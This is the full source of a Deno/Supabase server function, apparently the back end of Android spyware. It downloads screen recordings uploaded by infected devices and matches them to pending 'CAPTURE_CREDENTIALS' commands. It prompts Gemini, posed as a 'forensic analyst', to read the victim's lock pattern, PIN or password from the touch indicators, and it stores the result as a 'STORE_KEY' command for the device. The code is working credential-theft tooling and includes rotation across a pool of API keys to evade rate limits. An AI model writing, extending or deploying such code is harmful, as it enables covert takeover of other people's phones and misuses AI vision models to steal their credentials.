import { serve } from "https://deno.land/std@0.168.0/http/server.ts";
import { createClient } from "https://esm.sh/@supabase/supabase-js@2";
import { encode as base64Encode } from "https://deno.land/std@0.145.0/encoding/base64.ts";

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Headers": "authorization, x-client-info, apikey, content-type",
};

serve(async (req) => {
  console.log("--- [VISION_ENGINE] NEW INVOCATION START ---");
  if (req.method === "OPTIONS") return new Response("ok", { headers: corsHeaders });

  const supabaseUrl = Deno.env.get("SUPABASE_URL")!;
  const supabaseServiceKey = Deno.env.get("SUPABASE_SERVICE_ROLE_KEY")!;
  const supabase = createClient(supabaseUrl, supabaseServiceKey);

  try {
    const payload = await req.json();
    console.log("[STEP 1] Received JSON payload:", JSON.stringify(payload));

    let file_path = "";
    let device_id = "";
    let command_id = null;
    let bucket_id = "cortex-vision-vault";

    // Resolve Metadata
    if (payload.record && payload.table === "objects") {
      console.log("[STEP 2] Parsing payload as Storage Webhook.");
      file_path = payload.record.name; 
      bucket_id = payload.record.bucket_id;
      if (bucket_id !== "cortex-vision-vault") {
        console.log(`[ABORT] Invalid bucket: ${bucket_id}. Only watching 'cortex-vision-vault'.`);
        return new Response("Ignored bucket", { status: 200 });
      }
      device_id = file_path.split("/")[0];
    } else {
      console.log("[STEP 2] Parsing payload as Manual Invocation.");
      file_path = payload.file_path;
      device_id = payload.device_id;
      command_id = payload.command_id;
    }
    console.log(`Resolved: DeviceID: ${device_id}, Path: ${file_path}`);

    // Discovery: Find CAPTURE_CREDENTIALS cmd if not provided
    if (!command_id) {
      console.log("[STEP 3] Querying DB for latest pending CAPTURE_CREDENTIALS command...");
      const { data: cmdData, error: cmdQErr } = await supabase
        .from("file_commands")
        .select("id")
        .eq("device_id", device_id)
        .eq("file_name", "CAPTURE_CREDENTIALS")
        .neq("status", "RECOVERY_SUCCESS")
        .order("created_at", { ascending: false })
        .limit(1);
      
      if (cmdQErr) console.error("[DB_ERR] Command query failed:", cmdQErr);
      if (cmdData?.length) {
        command_id = cmdData[0].id;
        console.log(`Matched target to Command ID: ${command_id}`);
      } else {
        console.log("No pending capture command found. Proceeding with headless analysis.");
      }
    }

    // Prepare Media
    console.log(`[STEP 4] Downloading file from ${bucket_id}...`);
    const { data: fileData, error: dlErr } = await supabase.storage.from(bucket_id).download(file_path);
    if (dlErr) throw new Error(`Media Download Fail: ${dlErr.message}`);
    
    const videoSize = fileData.size;
    console.log(`File downloaded successfully. Size: ${(videoSize / 1024).toFixed(2)} KB`);
    const base64Video = base64Encode(new Uint8Array(await fileData.arrayBuffer()));

    // KEY ROTATION LOGIC
    console.log("[STEP 5] Refreshing available Gemini key pool...");
    const { data: apiKeys, error: keyErr } = await supabase
      .from("api_keys")
      .select("id, api_key")
      .eq("service", "gemini")
      .eq("is_active", true)
      .or(`cooldown_until.is.null,cooldown_until.lt.${new Date().toISOString()}`)
      .order("last_used_at", { ascending: true, nullsFirst: true });

    if (keyErr) throw new Error(`Key Pool Query Error: ${keyErr.message}`);
    if (!apiKeys?.length) throw new Error("No available Gemini API keys found in pool (All active keys may be in cooldown).");
    
    console.log(`Found ${apiKeys.length} available keys. Starting rotation loop.`);

    let geminiResult = null;
    let successKeyId = null;

    for (const keyRow of apiKeys) {
      console.log(`[STEP 6] Attempting API call with Key ID: ${keyRow.id}`);
      
      try {
        const response = await fetch(`https://generativelanguage.googleapis.com/v1beta/models/gemini-3.1-flash-lite:generateContent?key=${keyRow.api_key}`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            contents: [{
              parts: [
                { inlineData: { mimeType: "video/mp4", data: base64Video } },
                { text: "### ROLE: EXPERT FORENSIC ANALYST\n### TASK: CRITICAL SECURITY EXTRACTION\n\nAnalyze this Android screen recording with microscopic precision. Look for the translucent white touch indicator (Show Touches).\n\nIF THE TYPE IS A PATTERN:\n1. Grid Mapping: Use a standard 3x3 layout: [1,2,3; 4,5,6; 7,8,9].\n2. Expect Complexity: Expect the user to draw highly complex, non-linear, and non-symmetrical shapes. The path WILL cross over itself multiple times.\n3. Track Micro-Movements: Do not be lazy. Inspect every frame. Identify the exact frame where the touch dot stops or pivots on a grid point.\n4. Rule of Uniqueness: Android patterns only register the FIRST time a dot is hit in a single stroke. If the finger passes over dot 5 while moving from 1 to 9, and 5 was already used, ignore the second pass.\n5. Pivot Analysis: Clearly distinguish between 'passing near' a dot and 'pausing/activating' a dot.\n\nDO NOT GUESS. DO NOT ASSUME SYMMETRY. SPEND MAXIMUM TIME ANALYZING THE CROSS-OVER POINTS.\n\nReturn ONLY a raw JSON object:\n{\n  \"success\": true | false,\n  \"type\": \"PATTERN\" | \"PIN\" | \"PASSWORD\",\n  \"key\": [1, 5, 2, ...] | \"1234\",\n  \"confidence\": 0.0 to 1.0,\n  \"analysis_log\": \"Short summary of pivot points found\",\n  \"error\": \"Reason if success is false\"\n}" }
              ]
            }],
            generationConfig: { responseMimeType: "application/json" }
          })
        });

        if (response.status === 429) {
          console.warn(`[RATE_LIMIT] Key ${keyRow.id} returned 429. Setting 1-hour cooldown.`);
          const cooldown = new Date(Date.now() + 60 * 60 * 1000).toISOString();
          await supabase.from("api_keys").update({ cooldown_until: cooldown }).eq("id", keyRow.id);
          continue;
        }

        if (!response.ok) {
          const errTxt = await response.text();
          console.error(`[API_ERR] Key ${keyRow.id} failed (${response.status}):`, errTxt);
          continue;
        }

        const resJson = await response.json();
        const text = resJson.candidates?.[0]?.content?.parts?.[0]?.text;
        console.log("[STEP 7] Gemini Raw Output:", text);

        if (text) {
          geminiResult = JSON.parse(text.trim());
          successKeyId = keyRow.id;
          console.log("JSON parsed successfully. Confidence:", geminiResult.confidence);
          break; 
        }
      } catch (loopErr) {
        console.error(`[LOOP_FAIL] Unexpected error during key ${keyRow.id} attempt:`, loopErr.message);
      }
    }

    if (!geminiResult) throw new Error("Key rotation exhausted: All keys failed to process the request.");

    // Finalize: Update key usage and broadcast results
    console.log(`[STEP 8] Updating Key Usage for ID: ${successKeyId}`);
    await supabase.from("api_keys").update({ last_used_at: new Date().toISOString() }).eq("id", successKeyId);

    if (geminiResult.success && geminiResult.key) {
      const keyStr = typeof geminiResult.key === "object" ? JSON.stringify(geminiResult.key) : String(geminiResult.key);
      console.log("[STEP 9] Success detected. Broadcasting STORE_KEY command.");
      
      const { error: insErr } = await supabase.from("file_commands").insert([
        { device_id, file_name: "STORE_KEY", content: `${geminiResult.type} | ${keyStr}`, status: "PENDING" }
      ]);
      if (insErr) console.error("[DB_ERR] Failed to insert STORE_KEY:", insErr);

      if (command_id) {
        console.log("Closing original capture command as RECOVERY_SUCCESS.");
        await supabase.from("file_commands").update({ status: "RECOVERY_SUCCESS", result_data: geminiResult }).eq("id", command_id);
      }
    } else {
      console.warn("[STEP 9] Gemini reported failure or missing key. Updating original command.");
      if (command_id) await supabase.from("file_commands").update({ status: "RECOVERY_FAILED", error_log: geminiResult.error || "Gemini failed extract" }).eq("id", command_id);
    }

    console.log("--- [VISION_ENGINE] EXECUTION COMPLETE ---");
    return new Response(JSON.stringify(geminiResult), { status: 200, headers: { ...corsHeaders, "Content-Type": "application/json" } });

  } catch (err) {
    console.error("!!! [VISION_ENGINE_FATAL_ERROR] !!!");
    console.error("Msg:", err.message);
    console.error("Stack:", err.stack);
    return new Response(JSON.stringify({ error: err.message, fatal: true }), { status: 500, headers: { ...corsHeaders, "Content-Type": "application/json" } });
  }
});